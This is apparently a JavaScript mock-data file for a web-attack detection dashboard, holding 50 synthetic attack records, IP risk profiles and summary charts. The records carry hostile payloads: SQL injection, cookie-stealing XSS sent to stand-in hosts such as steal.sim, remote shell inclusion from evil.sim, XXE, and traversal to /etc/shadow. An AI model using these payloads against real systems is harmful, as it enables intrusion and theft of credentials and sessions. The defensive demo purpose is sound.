// ──────────────────────────────────────────────────────────────────────────────
// MOCK DATA — All data here is SYNTHETIC / SIMULATED.
// Used for demo purposes only. Not real intelligence.
// ──────────────────────────────────────────────────────────────────────────────

export const ATTACK_TYPES = [
  'SQL Injection',
  'XSS',
  'Command Injection',
  'Path Traversal',
  'SSRF',
  'XXE',
  'IDOR',
  'Brute Force',
  'LFI',
  'RFI',
];

export const DETECTION_METHODS = [
  'ML Classifier',
  'Regex Pattern',
  'Heuristic Engine',
  'Signature Match',
  'Anomaly Detection',
];

export const SEVERITIES = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'];

// ─── Mock Attacks (50 synthetic records) ──────────────────────────────────────
export const mockAttacks = [
  { id: 'atk-001', timestamp: '2026-08-17T22:45:12Z', source_ip: '192.168.1.25', target_url: "/admin/login?id=1' OR '1'='1", attack_type: 'SQL Injection', severity: 'CRITICAL', confidence: 0.97, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: "id=1' OR '1'='1" },
  { id: 'atk-002', timestamp: '2026-08-17T22:43:08Z', source_ip: '10.0.0.47',    target_url: '/search?q=<script>alert(1)</script>', attack_type: 'XSS', severity: 'HIGH', confidence: 0.93, result: 'POTENTIAL_SUCCESS', detection_method: 'Regex Pattern', payload: '<script>alert(1)</script>' },
  { id: 'atk-003', timestamp: '2026-08-17T22:40:55Z', source_ip: '172.16.5.82',  target_url: '/api/exec?cmd=cat+/etc/passwd', attack_type: 'Command Injection', severity: 'CRITICAL', confidence: 0.99, result: 'POTENTIAL_SUCCESS', detection_method: 'Heuristic Engine', payload: 'cmd=cat /etc/passwd' },
  { id: 'atk-004', timestamp: '2026-08-17T22:38:20Z', source_ip: '192.168.1.25', target_url: '/file?path=../../etc/shadow', attack_type: 'Path Traversal', severity: 'HIGH', confidence: 0.88, result: 'ATTEMPT', detection_method: 'Signature Match', payload: '../../etc/shadow' },
  { id: 'atk-005', timestamp: '2026-08-17T22:35:04Z', source_ip: '10.10.10.12',  target_url: '/fetch?url=http://169.254.169.254/latest/meta-data/', attack_type: 'SSRF', severity: 'CRITICAL', confidence: 0.95, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'url=http://169.254.169.254' },
  { id: 'atk-006', timestamp: '2026-08-17T22:33:14Z', source_ip: '192.168.2.100',target_url: '/api/users?id=UNION SELECT username,password FROM users--', attack_type: 'SQL Injection', severity: 'CRITICAL', confidence: 0.96, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'UNION SELECT username,password' },
  { id: 'atk-007', timestamp: '2026-08-17T22:30:00Z', source_ip: '10.0.0.47',    target_url: '/profile?bio=<img src=x onerror=fetch(atob("..."))', attack_type: 'XSS', severity: 'HIGH', confidence: 0.91, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: '<img src=x onerror=...' },
  { id: 'atk-008', timestamp: '2026-08-17T22:28:40Z', source_ip: '172.16.5.82',  target_url: '/upload?file=../../../../etc/crontab', attack_type: 'Path Traversal', severity: 'HIGH', confidence: 0.85, result: 'ATTEMPT', detection_method: 'Heuristic Engine', payload: '../../../../etc/crontab' },
  { id: 'atk-009', timestamp: '2026-08-17T22:25:10Z', source_ip: '192.168.3.55', target_url: "/login?user=admin'--", attack_type: 'SQL Injection', severity: 'HIGH', confidence: 0.90, result: 'POTENTIAL_SUCCESS', detection_method: 'Signature Match', payload: "admin'--" },
  { id: 'atk-010', timestamp: '2026-08-17T22:22:30Z', source_ip: '10.10.10.12',  target_url: '/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', attack_type: 'XXE', severity: 'CRITICAL', confidence: 0.98, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'XXE entity injection' },
  { id: 'atk-011', timestamp: '2026-08-17T22:20:05Z', source_ip: '192.168.1.77', target_url: '/api/orders/4521', attack_type: 'IDOR', severity: 'MEDIUM', confidence: 0.78, result: 'POTENTIAL_SUCCESS', detection_method: 'Anomaly Detection', payload: 'order_id=4521 (not owned by user)' },
  { id: 'atk-012', timestamp: '2026-08-17T22:18:44Z', source_ip: '192.168.1.25', target_url: '/admin/login', attack_type: 'Brute Force', severity: 'HIGH', confidence: 0.87, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: '287 failed login attempts' },
  { id: 'atk-013', timestamp: '2026-08-17T22:15:11Z', source_ip: '10.0.0.200',   target_url: '/view?page=php://filter/convert.base64-encode/resource=index.php', attack_type: 'LFI', severity: 'CRITICAL', confidence: 0.96, result: 'POTENTIAL_SUCCESS', detection_method: 'Signature Match', payload: 'php://filter/...' },
  { id: 'atk-014', timestamp: '2026-08-17T22:12:00Z', source_ip: '172.16.0.33',  target_url: '/include?file=http://evil.sim/shell.php', attack_type: 'RFI', severity: 'CRITICAL', confidence: 0.99, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'http://evil.sim/shell.php' },
  { id: 'atk-015', timestamp: '2026-08-17T22:10:22Z', source_ip: '192.168.2.100',target_url: '/search?q=<svg onload=alert(document.cookie)>', attack_type: 'XSS', severity: 'HIGH', confidence: 0.89, result: 'POTENTIAL_SUCCESS', detection_method: 'Regex Pattern', payload: '<svg onload=...' },
  { id: 'atk-016', timestamp: '2026-08-17T22:08:05Z', source_ip: '10.10.10.12',  target_url: "/api/products?cat=1 AND 1=1--", attack_type: 'SQL Injection', severity: 'MEDIUM', confidence: 0.82, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: '1 AND 1=1--' },
  { id: 'atk-017', timestamp: '2026-08-17T22:05:50Z', source_ip: '192.168.1.77', target_url: '/api/users/1003/profile', attack_type: 'IDOR', severity: 'MEDIUM', confidence: 0.74, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: 'Accessing user 1003 (not self)' },
  { id: 'atk-018', timestamp: '2026-08-17T22:03:20Z', source_ip: '172.16.5.82',  target_url: '/exec?cmd=whoami;id;uname -a', attack_type: 'Command Injection', severity: 'CRITICAL', confidence: 0.98, result: 'POTENTIAL_SUCCESS', detection_method: 'Heuristic Engine', payload: 'whoami;id;uname -a' },
  { id: 'atk-019', timestamp: '2026-08-17T22:00:00Z', source_ip: '192.168.4.88', target_url: '/login?user=admin&pass=admin', attack_type: 'Brute Force', severity: 'LOW', confidence: 0.65, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: 'Common credential attempt' },
  { id: 'atk-020', timestamp: '2026-08-17T21:57:33Z', source_ip: '10.0.0.47',    target_url: '/fetch?target=http://internal-api.sim/admin', attack_type: 'SSRF', severity: 'HIGH', confidence: 0.91, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'internal-api.sim/admin' },
  { id: 'atk-021', timestamp: '2026-08-17T21:54:00Z', source_ip: '192.168.1.25', target_url: "/products?sort=name' ORDER BY 1--", attack_type: 'SQL Injection', severity: 'HIGH', confidence: 0.88, result: 'ATTEMPT', detection_method: 'Signature Match', payload: "ORDER BY 1--" },
  { id: 'atk-022', timestamp: '2026-08-17T21:50:15Z', source_ip: '192.168.5.11', target_url: '/report.php?file=../../../../windows/win.ini', attack_type: 'Path Traversal', severity: 'MEDIUM', confidence: 0.80, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: '../../../../windows/win.ini' },
  { id: 'atk-023', timestamp: '2026-08-17T21:48:40Z', source_ip: '172.16.0.33',  target_url: '/api/data?xml=<user><name>test</name></user>', attack_type: 'XXE', severity: 'HIGH', confidence: 0.85, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'XML with entity attempt' },
  { id: 'atk-024', timestamp: '2026-08-17T21:45:10Z', source_ip: '10.10.10.12',  target_url: '/api/invoices/77281', attack_type: 'IDOR', severity: 'LOW', confidence: 0.68, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: 'invoice_id=77281' },
  { id: 'atk-025', timestamp: '2026-08-17T21:42:05Z', source_ip: '192.168.2.100',target_url: '/search?q="><script>document.location="http://steal.sim/"+document.cookie</script>', attack_type: 'XSS', severity: 'CRITICAL', confidence: 0.97, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'Cookie exfiltration XSS' },
  { id: 'atk-026', timestamp: '2026-08-17T21:39:00Z', source_ip: '192.168.1.77', target_url: '/admin/login', attack_type: 'Brute Force', severity: 'HIGH', confidence: 0.86, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: '145 requests in 30 seconds' },
  { id: 'atk-027', timestamp: '2026-08-17T21:36:18Z', source_ip: '10.0.0.200',   target_url: "/user?name='; DROP TABLE users;--", attack_type: 'SQL Injection', severity: 'CRITICAL', confidence: 0.99, result: 'ATTEMPT', detection_method: 'Signature Match', payload: "DROP TABLE users" },
  { id: 'atk-028', timestamp: '2026-08-17T21:33:40Z', source_ip: '172.16.5.82',  target_url: '/download?path=/etc/hosts', attack_type: 'Path Traversal', severity: 'LOW', confidence: 0.71, result: 'ATTEMPT', detection_method: 'Heuristic Engine', payload: '/etc/hosts access' },
  { id: 'atk-029', timestamp: '2026-08-17T21:30:25Z', source_ip: '192.168.4.88', target_url: '/api/redirect?url=file:///etc/passwd', attack_type: 'SSRF', severity: 'CRITICAL', confidence: 0.96, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'file:///etc/passwd' },
  { id: 'atk-030', timestamp: '2026-08-17T21:27:00Z', source_ip: '10.10.10.12',  target_url: '/cms?page=.htaccess', attack_type: 'LFI', severity: 'HIGH', confidence: 0.87, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: '.htaccess' },
  { id: 'atk-031', timestamp: '2026-08-17T21:24:12Z', source_ip: '192.168.1.25', target_url: '/api/search?q=<input autofocus onfocus=alert(1)>', attack_type: 'XSS', severity: 'MEDIUM', confidence: 0.79, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: 'autofocus onfocus' },
  { id: 'atk-032', timestamp: '2026-08-17T21:21:55Z', source_ip: '192.168.5.11', target_url: "/login?pass=';EXEC xp_cmdshell('dir')--", attack_type: 'SQL Injection', severity: 'CRITICAL', confidence: 0.98, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: "xp_cmdshell('dir')" },
  { id: 'atk-033', timestamp: '2026-08-17T21:19:30Z', source_ip: '172.16.0.33',  target_url: '/upload?dest=http://c2.sim/webhook', attack_type: 'SSRF', severity: 'HIGH', confidence: 0.90, result: 'POTENTIAL_SUCCESS', detection_method: 'Anomaly Detection', payload: 'c2.sim exfil webhook' },
  { id: 'atk-034', timestamp: '2026-08-17T21:16:00Z', source_ip: '10.0.0.47',    target_url: '/backup?file=/proc/self/environ', attack_type: 'LFI', severity: 'CRITICAL', confidence: 0.94, result: 'POTENTIAL_SUCCESS', detection_method: 'Signature Match', payload: '/proc/self/environ' },
  { id: 'atk-035', timestamp: '2026-08-17T21:13:18Z', source_ip: '192.168.3.55', target_url: '/admin', attack_type: 'Brute Force', severity: 'MEDIUM', confidence: 0.77, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: 'Directory brute force scan' },
  { id: 'atk-036', timestamp: '2026-08-17T21:10:04Z', source_ip: '192.168.2.100',target_url: '/include?page=http://attacker.sim/c99.php', attack_type: 'RFI', severity: 'CRITICAL', confidence: 0.99, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'Remote file inclusion' },
  { id: 'atk-037', timestamp: '2026-08-17T21:07:44Z', source_ip: '192.168.1.77', target_url: "/api/filter?id=1' AND SLEEP(5)--", attack_type: 'SQL Injection', severity: 'HIGH', confidence: 0.92, result: 'ATTEMPT', detection_method: 'Heuristic Engine', payload: 'SLEEP(5) blind injection' },
  { id: 'atk-038', timestamp: '2026-08-17T21:05:00Z', source_ip: '10.10.10.12',  target_url: '/data?xml=<!ENTITY % ext SYSTEM "http://evil.sim/x.dtd">', attack_type: 'XXE', severity: 'CRITICAL', confidence: 0.97, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'External DTD injection' },
  { id: 'atk-039', timestamp: '2026-08-17T21:02:20Z', source_ip: '192.168.4.88', target_url: '/api/orders/10042/receipt', attack_type: 'IDOR', severity: 'HIGH', confidence: 0.83, result: 'POTENTIAL_SUCCESS', detection_method: 'Anomaly Detection', payload: 'Cross-user order access' },
  { id: 'atk-040', timestamp: '2026-08-17T20:59:50Z', source_ip: '172.16.5.82',  target_url: '/run?cmd=ping+-c+4+attacker.sim', attack_type: 'Command Injection', severity: 'HIGH', confidence: 0.91, result: 'ATTEMPT', detection_method: 'Heuristic Engine', payload: 'ping attacker.sim' },
  { id: 'atk-041', timestamp: '2026-08-17T20:56:12Z', source_ip: '192.168.1.25', target_url: "/products?name=test' UNION SELECT null,table_name FROM information_schema.tables--", attack_type: 'SQL Injection', severity: 'CRITICAL', confidence: 0.98, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'Schema enumeration' },
  { id: 'atk-042', timestamp: '2026-08-17T20:53:00Z', source_ip: '10.0.0.200',   target_url: '/preview?url=dict://localhost:22/', attack_type: 'SSRF', severity: 'HIGH', confidence: 0.88, result: 'ATTEMPT', detection_method: 'Anomaly Detection', payload: 'dict:// protocol SSRF' },
  { id: 'atk-043', timestamp: '2026-08-17T20:50:35Z', source_ip: '192.168.5.11', target_url: '/themes?name=<marquee onstart=alert(1)>', attack_type: 'XSS', severity: 'MEDIUM', confidence: 0.76, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: '<marquee onstart=' },
  { id: 'atk-044', timestamp: '2026-08-17T20:47:18Z', source_ip: '172.16.0.33',  target_url: '/resources?file=../../config/database.yml', attack_type: 'Path Traversal', severity: 'CRITICAL', confidence: 0.95, result: 'POTENTIAL_SUCCESS', detection_method: 'Signature Match', payload: 'database.yml exfil' },
  { id: 'atk-045', timestamp: '2026-08-17T20:44:00Z', source_ip: '192.168.3.55', target_url: '/admin/login', attack_type: 'Brute Force', severity: 'CRITICAL', confidence: 0.93, result: 'POTENTIAL_SUCCESS', detection_method: 'Anomaly Detection', payload: '2000+ requests in 10 minutes' },
  { id: 'atk-046', timestamp: '2026-08-17T20:41:22Z', source_ip: '10.10.10.12',  target_url: '/api/export?type=json&filter=1=1', attack_type: 'SQL Injection', severity: 'HIGH', confidence: 0.86, result: 'ATTEMPT', detection_method: 'ML Classifier', payload: 'filter=1=1 bypass' },
  { id: 'atk-047', timestamp: '2026-08-17T20:38:05Z', source_ip: '192.168.2.100',target_url: '/rss?feed=http://internal.sim/admin/config', attack_type: 'SSRF', severity: 'HIGH', confidence: 0.89, result: 'ATTEMPT', detection_method: 'Heuristic Engine', payload: 'internal.sim/admin' },
  { id: 'atk-048', timestamp: '2026-08-17T20:35:40Z', source_ip: '192.168.4.88', target_url: '/page?view=../../../../boot.ini', attack_type: 'Path Traversal', severity: 'MEDIUM', confidence: 0.81, result: 'ATTEMPT', detection_method: 'Regex Pattern', payload: 'boot.ini access' },
  { id: 'atk-049', timestamp: '2026-08-17T20:32:00Z', source_ip: '172.16.5.82',  target_url: '/include?src=file:///etc/mysql/my.cnf', attack_type: 'LFI', severity: 'CRITICAL', confidence: 0.96, result: 'POTENTIAL_SUCCESS', detection_method: 'Signature Match', payload: 'MySQL config exfil' },
  { id: 'atk-050', timestamp: '2026-08-17T20:29:18Z', source_ip: '10.0.0.47',    target_url: '/report?template=<script>window.location="http://steal.sim/?c="+btoa(document.cookie)</script>', attack_type: 'XSS', severity: 'CRITICAL', confidence: 0.99, result: 'POTENTIAL_SUCCESS', detection_method: 'ML Classifier', payload: 'Session hijack XSS' },
];

// ─── Mock IP Profiles ──────────────────────────────────────────────────────────
export const mockIPProfiles = {
  '192.168.1.25': {
    ip: '192.168.1.25',
    risk_score: 94,
    risk_level: 'CRITICAL',
    total_requests: 487,
    attack_count: 8,
    attack_types: ['SQL Injection', 'Path Traversal', 'Brute Force', 'XSS'],
    first_seen: '2026-08-10T08:22:00Z',
    last_seen:  '2026-08-17T22:45:12Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'attacker-node-25.sim.local',
    daily_activity: [
      { date: '08/11', requests: 45, attacks: 3 },
      { date: '08/12', requests: 62, attacks: 5 },
      { date: '08/13', requests: 38, attacks: 2 },
      { date: '08/14', requests: 90, attacks: 8 },
      { date: '08/15', requests: 74, attacks: 6 },
      { date: '08/16', requests: 110, attacks: 10 },
      { date: '08/17', requests: 68, attacks: 8 },
    ],
  },
  '10.0.0.47': {
    ip: '10.0.0.47',
    risk_score: 81,
    risk_level: 'HIGH',
    total_requests: 312,
    attack_count: 6,
    attack_types: ['XSS', 'SSRF', 'LFI'],
    first_seen: '2026-08-12T14:10:00Z',
    last_seen:  '2026-08-17T22:43:08Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'node-47.internal.sim',
    daily_activity: [
      { date: '08/12', requests: 22, attacks: 1 },
      { date: '08/13', requests: 45, attacks: 2 },
      { date: '08/14', requests: 60, attacks: 4 },
      { date: '08/15', requests: 70, attacks: 5 },
      { date: '08/16', requests: 55, attacks: 3 },
      { date: '08/17', requests: 60, attacks: 6 },
    ],
  },
  '172.16.5.82': {
    ip: '172.16.5.82',
    risk_score: 88,
    risk_level: 'CRITICAL',
    total_requests: 258,
    attack_count: 7,
    attack_types: ['Command Injection', 'Path Traversal', 'LFI'],
    first_seen: '2026-08-13T06:55:00Z',
    last_seen:  '2026-08-17T22:40:55Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'exploit-bot-82.sim',
    daily_activity: [
      { date: '08/13', requests: 30, attacks: 2 },
      { date: '08/14', requests: 50, attacks: 4 },
      { date: '08/15', requests: 40, attacks: 3 },
      { date: '08/16', requests: 65, attacks: 5 },
      { date: '08/17', requests: 73, attacks: 7 },
    ],
  },
  '10.10.10.12': {
    ip: '10.10.10.12',
    risk_score: 76,
    risk_level: 'HIGH',
    total_requests: 195,
    attack_count: 6,
    attack_types: ['SSRF', 'XXE', 'SQL Injection', 'LFI', 'IDOR'],
    first_seen: '2026-08-14T11:30:00Z',
    last_seen:  '2026-08-17T22:35:04Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'scanner-12.test.sim',
    daily_activity: [
      { date: '08/14', requests: 20, attacks: 1 },
      { date: '08/15', requests: 40, attacks: 3 },
      { date: '08/16', requests: 60, attacks: 4 },
      { date: '08/17', requests: 75, attacks: 6 },
    ],
  },
  '192.168.2.100': {
    ip: '192.168.2.100',
    risk_score: 89,
    risk_level: 'CRITICAL',
    total_requests: 221,
    attack_count: 5,
    attack_types: ['SQL Injection', 'XSS', 'SSRF', 'RFI'],
    first_seen: '2026-08-15T09:00:00Z',
    last_seen:  '2026-08-17T22:33:14Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'malbot-100.sim.net',
    daily_activity: [
      { date: '08/15', requests: 55, attacks: 2 },
      { date: '08/16', requests: 80, attacks: 3 },
      { date: '08/17', requests: 86, attacks: 5 },
    ],
  },
  '192.168.1.77': {
    ip: '192.168.1.77',
    risk_score: 58,
    risk_level: 'MEDIUM',
    total_requests: 98,
    attack_count: 4,
    attack_types: ['IDOR', 'Brute Force', 'SQL Injection'],
    first_seen: '2026-08-16T17:00:00Z',
    last_seen:  '2026-08-17T22:07:44Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'node-77.sim',
    daily_activity: [
      { date: '08/16', requests: 40, attacks: 2 },
      { date: '08/17', requests: 58, attacks: 4 },
    ],
  },
  '172.16.0.33': {
    ip: '172.16.0.33',
    risk_score: 72,
    risk_level: 'HIGH',
    total_requests: 140,
    attack_count: 4,
    attack_types: ['RFI', 'SSRF', 'XXE', 'Path Traversal'],
    first_seen: '2026-08-16T08:15:00Z',
    last_seen:  '2026-08-17T22:19:30Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'probe-33.sim.local',
    daily_activity: [
      { date: '08/16', requests: 60, attacks: 2 },
      { date: '08/17', requests: 80, attacks: 4 },
    ],
  },
  '192.168.3.55': {
    ip: '192.168.3.55',
    risk_score: 83,
    risk_level: 'CRITICAL',
    total_requests: 178,
    attack_count: 3,
    attack_types: ['SQL Injection', 'Brute Force'],
    first_seen: '2026-08-17T18:00:00Z',
    last_seen:  '2026-08-17T22:25:10Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'brutenode-55.sim',
    daily_activity: [
      { date: '08/17', requests: 178, attacks: 3 },
    ],
  },
  '10.0.0.200': {
    ip: '10.0.0.200',
    risk_score: 61,
    risk_level: 'HIGH',
    total_requests: 112,
    attack_count: 3,
    attack_types: ['LFI', 'SSRF', 'SQL Injection'],
    first_seen: '2026-08-17T19:30:00Z',
    last_seen:  '2026-08-17T22:15:11Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'lfi-scanner-200.sim',
    daily_activity: [
      { date: '08/17', requests: 112, attacks: 3 },
    ],
  },
  '192.168.4.88': {
    ip: '192.168.4.88',
    risk_score: 45,
    risk_level: 'MEDIUM',
    total_requests: 76,
    attack_count: 3,
    attack_types: ['Brute Force', 'SSRF', 'IDOR', 'Path Traversal'],
    first_seen: '2026-08-17T20:00:00Z',
    last_seen:  '2026-08-17T22:02:20Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'probe-88.internal.sim',
    daily_activity: [
      { date: '08/17', requests: 76, attacks: 3 },
    ],
  },
  '192.168.5.11': {
    ip: '192.168.5.11',
    risk_score: 38,
    risk_level: 'MEDIUM',
    total_requests: 55,
    attack_count: 2,
    attack_types: ['Path Traversal', 'SQL Injection', 'XSS'],
    first_seen: '2026-08-17T20:30:00Z',
    last_seen:  '2026-08-17T21:50:15Z',
    country: 'SIMULATED',
    isp: 'Demo-ISP-Sim',
    hostname: 'node-11.sim.net',
    daily_activity: [
      { date: '08/17', requests: 55, attacks: 2 },
    ],
  },
};

// ─── Dashboard Summary ─────────────────────────────────────────────────────────
export const mockDashboard = {
  total_requests: 3847,
  total_attacks: 50,
  high_risk_ips: 5,
  potential_successes: 18,
  attack_distribution: [
    { name: 'SQL Injection', count: 13, fill: '#ef4444' },
    { name: 'XSS',           count: 9,  fill: '#f97316' },
    { name: 'Command Inj.',  count: 4,  fill: '#a855f7' },
    { name: 'Path Traversal',count: 7,  fill: '#3b82f6' },
    { name: 'SSRF',          count: 6,  fill: '#06b6d4' },
    { name: 'XXE',           count: 3,  fill: '#eab308' },
    { name: 'IDOR',          count: 4,  fill: '#22c55e' },
    { name: 'Brute Force',   count: 5,  fill: '#ec4899' },
    { name: 'LFI',           count: 5,  fill: '#f59e0b' },
    { name: 'RFI',           count: 2,  fill: '#8b5cf6' },
  ],
  severity_distribution: [
    { name: 'CRITICAL', value: 20, fill: '#ef4444' },
    { name: 'HIGH',     value: 18, fill: '#f97316' },
    { name: 'MEDIUM',   value: 9,  fill: '#eab308' },
    { name: 'LOW',      value: 3,  fill: '#22c55e' },
  ],
  attack_timeline: [
    { date: '08/11', attacks: 3,  requests: 245 },
    { date: '08/12', attacks: 7,  requests: 410 },
    { date: '08/13', attacks: 5,  requests: 320 },
    { date: '08/14', attacks: 11, requests: 590 },
    { date: '08/15', attacks: 8,  requests: 480 },
    { date: '08/16', attacks: 9,  requests: 530 },
    { date: '08/17', attacks: 7,  requests: 272 },
  ],
};

// ─── Mock PCAP Results ─────────────────────────────────────────────────────────
export const mockPCAPResult = {
  filename: 'demo_capture.pcap',
  file_size_kb: 1842,
  packets_processed: 12847,
  http_requests_extracted: 312,
  attacks_detected: 23,
  high_risk_ips: 4,
  processing_time_ms: 2340,
  attacks: mockAttacks.slice(0, 23).map(a => ({ ...a })),
};

// ─── Mock Export Data ──────────────────────────────────────────────────────────
export const getExportData = () => ({
  metadata: {
    exported_at: new Date().toISOString(),
    data_type: 'SIMULATED_DEMO_DATA',
    total_attacks: mockAttacks.length,
    disclaimer: 'This data is entirely synthetic and generated for demonstration purposes only.',
  },
  attacks: mockAttacks,
  ip_profiles: Object.values(mockIPProfiles),
  dashboard_summary: mockDashboard,
});

// ─── Derived: Top Source IPs by Attack Count ───────────────────────────────────
// Computed from real mockAttacks — not invented.
export function getTopSourceIPs(limit = 6) {
  const counts = {};
  for (const atk of mockAttacks) {
    counts[atk.source_ip] = (counts[atk.source_ip] ?? 0) + 1;
  }
  return Object.entries(counts)
    .sort(([, a], [, b]) => b - a)
    .slice(0, limit)
    .map(([ip, attacks]) => ({ ip, attacks }));
}

